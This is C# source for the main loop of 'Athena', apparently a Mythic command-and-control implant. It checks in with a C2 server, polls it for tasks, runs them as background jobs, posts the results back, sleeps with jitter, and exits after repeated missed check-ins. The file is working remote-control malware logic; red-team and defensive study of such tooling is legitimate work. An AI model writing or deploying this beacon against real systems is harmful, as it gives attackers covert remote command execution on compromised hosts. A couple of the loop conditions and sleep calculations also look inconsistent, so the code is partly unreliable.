using Athena.Commands;
using Athena.Mythic.Model.Checkin;
using Athena.Mythic.Model;
using Athena.Utilities;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System;

namespace Athena
{
    class Program
    {
        static void Main(string[] args)
        {
            //https://www.youtube.com/watch?v=xdmdHMjK1KA
            //1:36:39 for learning how to automatically generate the agents

            //MythicClient controls all of the agent communications
            Globals.mc = new MythicClient();
            CheckinResponse res = Globals.mc.CheckIn();
            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while(res.status != "success" || Globals.missedCheckins == Globals.maxMissedCheckins)
            {
                res = Globals.mc.CheckIn();
                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
                Globals.missedCheckins += 1;

                if (Globals.missedCheckins == Globals.maxMissedCheckins)
                {
                    Environment.Exit(0);
                }
            }
            Globals.missedCheckins = 0;
            Globals.mc.MythicConfig.uuid = res.id;

            //Main Loop
            //Need to add the missed checkins check here.
            while (!(Globals.missedCheckins == Globals.maxMissedCheckins) & !Globals.exit)
            {
                List<MythicTask> tasks = Globals.mc.GetTasks();
                if (tasks == null)
                {
                    Globals.missedCheckins += 1;
                    if (Globals.missedCheckins == Globals.maxMissedCheckins)
                    {
                        Environment.Exit(0);
                    }
                }
                else
                {
                    Globals.missedCheckins = 0;
                    //Kick off Tasks
                    foreach (var task in tasks)
                    {
                        Globals.jobs.Add(task.id, new MythicJob(task));
                    }

                    //To prevent issues with modifying the array during enumeration
                    Dictionary<string, MythicJob> hasoutput = new Dictionary<string, MythicJob>();

                    //Check jobs to see if they have output
                    foreach (var job in Globals.jobs.Keys)
                    {
                        if (Globals.jobs[job].hasoutput)
                        {
                            hasoutput.Add(job, Globals.jobs[job]);
                            Globals.jobs[job].hasoutput = false;
                        }
                        else if (!Globals.jobs[job].started)
                        {
                            Task.Run(() =>
                            {
                                try
                                {
                                    CommandHandler.StartJob(Globals.jobs[job]);
                                }
                                catch (Exception e)
                                {
                                    Globals.jobs[job].complete = true;
                                    Globals.jobs[job].hasoutput = true;
                                    Globals.jobs[job].taskresult = e.Message;
                                    Globals.jobs[job].errored = true;
                                }
                            });
                        }
                    }

                    //Return output if server is accessible
                    if (hasoutput.Count > 0)
                    {
                        //Did the POST send properly?
                        if (Globals.mc.PostResponse(hasoutput))
                        {
                            //Remove sent commands from the Global job Dictionary or clear out taskresult of long running tasks
                            foreach (var job in hasoutput.Values)
                            {
                                //Remove job from Global
                                if (job.complete)
                                {
                                    Globals.jobs.Remove(job.task.id);
                                }
                                //Clear out current task buffer for job.
                                else
                                {
                                    string sent = Globals.jobs[job.task.id].taskresult;
                                    //Hopefully this fixes the issue with missing text being returned to the server.
                                    Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
                                }
                            }
                        }
                    }

                    //Get sleep and go
                    Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
                }
            }
        }
    }
}
